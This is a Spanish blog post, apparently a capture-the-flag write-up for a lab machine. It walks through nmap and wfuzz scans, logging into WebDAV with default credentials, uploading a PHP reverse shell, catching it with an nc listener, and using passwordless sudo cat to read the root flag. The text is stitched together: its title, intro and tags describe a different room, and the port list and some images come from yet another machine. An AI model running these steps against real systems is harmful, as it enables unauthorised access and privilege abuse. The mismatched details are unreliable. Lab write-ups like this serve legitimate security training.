---
layout: single
title: Watcherv 1.4
excerpt: "Work your way through the machine and try to find all the flags you can!"
date: 2022-05-27
classes: wide
header:
  teaser: /assets/images/thm-writeup-watcher/watcher_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - nmap
  - couchdb
  - Web
  - Privilege escalation
---

![nmap](/assets/images/thm-writeup-watcher/watcher_logo.png)

[Link](https://tryhackme.com/room/watcher "Watcher")

This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. Feedback is always appreciated.

---

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~css
ping -c 1 {ip}
~~~

![ping](/assets/images/thm-writeup-vulnet/vulnet_whatweb.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los ***65535*** puertos de red con el siguiente comando:
  
~~~css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip}
~~~

![ping](/assets/images/thm-writeup-vulnet/vulnet_nmap1.png)

---

- Escaeno de vulnerabilidades sobre los puertos: 22,111,139,445,873,2049,6379,34583,37021,37295,52355:

~~~css
nmap -sCV -T4 -p22,111,139,445,873,2049,6379,34583,37021,37295,52355 vuln.local --script vuln

└─#  nmap -v -A -sC -sV -Pn {ip} -p- --script vuln
~~~

---

- Revisión de la URL ***http://10.10.25.173:8080/***:

![url](/assets/images/thm-writeup-dav/dav_url.png)

---

## 3. WFUZ

- Escaeno de subdominios con wfuzz:

~~~css
└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt {ip}/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                         
=====================================================================
000037122:   401        14 L     54 W       460 Ch      "webdav"  
~~~

- Wfuzz encontró la misma ruta que el escaneo de vulnerabilidades con nmap ***webdav***.

---

## 4. Exploit

- Buscando contraseñas por defecto me encontré con la siguiente página que entrega una información importante ***<http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>***

![url](/assets/images/thm-writeup-dav/dav_web3.png)

---

- Cadaver: utilizamos esta aplicación para ingresar al target, con el usuario y contraseña encontrados en el punto anterior, como se observa a continuación:

~~~css
cadaver http://10.10.39.111/webdav/ 
Autenticación requerida para webdav en el servidor '10.10.39.111':
Nombre de usuario: wampp
Contraseña: 
dav:/webdav/> ls
Listando colección `/webdav/': exitoso.
        passwd.dav                            44  ago 25  2019

~~~

- Cargamos un archivo de prueba:
  
~~~css
dav:/webdav/> put test.txt
Transferiendo test.txt a '/webdav/test.txt':
 Progreso: [                              ]   0,0% of 6 bytes Progreso: [=============================>] 100,0% of 6 bytes exitoso.

~~~

- Comprobamos que el archivo que previamente creamos en la misma carpeta donde ejecutamos ***cadaver***

![url](/assets/images/thm-writeup-dav/dav_exploit_1.png)

- Descargamos  y configuramos una rshell desde la siguiente url: ***<https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php>*** en la misma carpeta donde ejecutamos ***cadaver***

![url](/assets/images/thm-writeup-dav/dav_rshell.png)

- Cargamos la rshell siguiendo el mismo procedimiento:

~~~css
dav:/webdav/> put rshell.php
Transferiendo rshell.php a '/webdav/rshell.php':
 Progreso: [                              ]   0,0% of 5491 bytes Progreso: [=============================>] 100,0% of 5491 bytes exitoso.
~~~

- Nos ponemos en escucha por el puerto ***4444***, de acuerdo con la configuración de la rshell:

~~~css
─# nc -nlvp 4444                                   
listening on [any] 4444 ...
~~~

- Ejecutamos la ***rshell.php***, entrando a la url target y abriendo este archivo:

![rshell](/assets/images/thm-writeup-dav/dav_rshell1.png)

dav_rshell1.png

- Obtenemos nuestra reverse shell como usuario ***www-data***:

~~~css
─# nc -nlvp 4444                                   
listening on [any] 4444 ...
connect to [10.9.0.43] from (UNKNOWN) [10.10.39.111] 34204
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:43:11 up 21 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
~~~

- Tratamiento de la shell, con el siguiente comando:

~~~python
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

---

## 5. Bandera de usuario

- Nos dirigimos a la carpeta ***home*** en esta accedmos al usuario ***merlin*** y en está última encontramos el archivo ***user.txt***:

![usr](/assets/images/thm-writeup-dav/dav_usr.png)

---

## 6. Bandera root

- Búsqueda de vulnerabilidades con el comando ***sudo -l***, en el cual observamos el binario ***cat*** :



~~~css
www-data@ubuntu:/usr/lib/openssh$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

~~~

- Abusando del binario ***cat*** podemos leer la bandera root sin entregar las credenciales respectivas, ubicandonos en el archivo raíz y ejecutando el siguiente comando:

![root](/assets/images/thm-writeup-dav/dav_cat.png)

~~~css
www-data@ubuntu:/bin$ cd ..
cd ..
www-data@ubuntu:/$ ls
ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
www-data@ubuntu:/$ sudo cat /root/root.txt
sudo cat /root/root.txt
??????
~~~

![root](/assets/images/thm-writeup-dav/dav_root.png)

---

## 7. Fuentes

- Exploit
<http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>

- Cat
<https://gtfobins.github.io/gtfobins/cat/>
